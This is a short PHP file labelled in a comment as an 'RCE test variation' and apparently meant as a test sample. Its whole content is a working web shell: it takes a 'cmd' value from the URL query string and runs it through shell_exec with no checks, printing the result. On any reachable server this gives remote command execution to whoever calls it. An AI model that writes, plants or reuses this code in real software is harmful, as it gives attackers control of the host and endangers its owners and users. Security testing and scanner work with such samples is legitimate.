<?php
// RCE test variation #666
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>